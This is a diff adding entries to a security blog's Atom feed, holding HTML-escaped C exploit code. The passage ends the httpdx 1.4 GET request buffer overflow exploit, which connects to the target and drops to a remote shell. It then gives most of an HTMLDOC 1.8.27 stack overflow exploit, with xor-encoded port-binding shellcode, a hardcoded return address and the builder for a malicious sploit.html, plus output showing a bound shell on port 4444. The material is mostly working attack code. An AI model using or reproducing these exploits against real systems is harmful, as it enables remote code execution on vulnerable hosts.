+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;[+] Sending payload &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;[-] Send &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inet_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;58821&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;[-] Socket &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;[-] Exploit failed. &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[+] Dropping to shell &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+    &lt;p&gt;&lt;a href=&quot;/posts/httpdx-1-4-get-request-remote-buffer-overflow-exploit-0day.html&quot;&gt;httpdx 1.4 GET Request Remote Buffer Overflow Exploit (0day)&lt;/a&gt; was originally published by Pankaj Kohli at &lt;a href=&quot;&quot;&gt;Pankaj Kohli&lt;/a&gt; on September 04, 2009.&lt;/p&gt;
+  </content>
+</entry>
+
+
+  
+
+<entry>
+  <title type="html"><![CDATA[HTMLDOC 'html' File Handling Remote Stack Buffer Overflow Exploit (Linux)]]></title>
+  <link rel="alternate" type="text/html" href="/posts/htmldoc-html-file-handling-remote-stack-buffer-overflow-exploit-linux.html" />
+  <id>/posts/htmldoc-html-file-handling-remote-stack-buffer-overflow-exploit-linux</id>
+  <published>2009-08-20T08:34:14+08:00</published>
+  <updated>2009-08-20T08:34:14+08:00</updated>
+  <author>
+    <name>Pankaj Kohli</name>
+    <uri></uri>
+    
+  </author>
+  <content type="html">
+    &lt;p&gt;The vulnerability exists in HTMLDOC version 1.8.27 and earlier due to an unsafe call to &lt;code&gt;sscanf()&lt;/code&gt; in the &lt;code&gt;set_page_size()&lt;/code&gt; function in &lt;code&gt;htmldoc/util.cxx&lt;/code&gt;. This can be exploited to cause a stack-based buffer overflow when an HTML document containing e.g. a specially crafted “MEDIA SIZE” comment is being processed.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cm&quot;&gt;/*&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; &lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;HTMLDOC &amp;#39;html&amp;#39; File Handling Remote Stack Buffer Overflow Exploit (Linux)&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;Reference: http://www.securityfocus.com/bid/35727&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; &lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;Tested on HTMLDOC 1.8.27 on Debian 5.0 (+ASLR)&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;Credit: ANTHRAX666 for finding the vulnerability&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; &lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;Coded by Pankaj Kohli&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; &lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;http://www.codepwn.com&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; &lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;pankaj@zion:~/test/htmldoc$ cat /proc/sys/kernel/randomize_va_space&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;2&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;pankaj@zion:~/test/htmldoc$ gcc htmldocb0f.c -o htmldocb0f&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;pankaj@zion:~/test/htmldoc$ ./htmldocb0f&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; &lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;[*] Creating buffer&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;[*] Exploit file written to sploit.html&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;Run as: htmldoc -f somefile.pdf sploit.html&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; &lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;pankaj@zion:~/test/htmldoc$ netstat -an --inet | grep 4444&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;pankaj@zion:~/test/htmldoc$ ./htmldoc-1.8.27/htmldoc/htmldoc -f abc.pdf sploit.html &amp;amp;&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;[1] 3287&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;pankaj@zion:~/test/htmldoc$ netstat -an --inet | grep 4444&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;tcp 0 0 0.0.0.0:4444 0.0.0.0:* LISTEN&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; &lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;*/&lt;/span&gt;
+ 
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
+ 
+&lt;span class=&quot;cm&quot;&gt;/* Port binding (xor encoded) shellcode (port 4444) */&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xeb\x12\x5b\x31\xc9\xb1\x75\x8a\x03\x34&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x1e\x88\x03\x43\x66\x49\x75\xf5\xeb\x05&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe8\xe9\xff\xff\xff\x74\x78\x46\x74\x1f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x45\x2f\xd7\x4f\x74\x1f\x74\x1c\x97\xff&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xd3\x9e\x97\xd8\x2f\xcc\x4c\x78\x76\x0f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x42\x78\x76\x1c\x1e\x97\xff\x74\x0e\x4f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x4e\x97\xff\xad\x1c\x74\x78\x46\xd3\x9e&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xae\x78\xad\x1a\xd3\x9e\x4c\x48\x97\xff&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x5d\x74\x78\x46\xd3\x9e\x97\xdd\x74\x1c&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x47\x74\x21\x46\xd3\x9e\xfc\xe7\x74\x21&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x46\xd3\x9e\x2f\xcc\x4c\x76\x70\x31\x6d&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x76\x76\x31\x31\x7c\x77\x97\xfd\x4c\x78&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x76\x33\x77\x97\xff\x4c\x4f\x4d\x97\xff&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x74\x15\x46\xd3\x9e\x74\x1f\x46\x2f\xc5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xd3\x9e&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ 
+&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0804d938&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// push esp; ret 0x0807;&lt;/span&gt;
+ 
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ 
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[*] Creating buffer&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;lt;!-- MEDIA SIZE 1x1&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;275&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+ 
+    &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;294&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000ff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;295&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000ff00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;296&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00ff0000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;297&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;298&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ 
+    &lt;span class=&quot;n&quot;&gt;strcat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+ 
+    &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;sploit.html&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;wb&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fclose&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;[*] Exploit file written to sploit.html&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Run as: htmldoc -f somefile.pdf sploit.html&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+ 
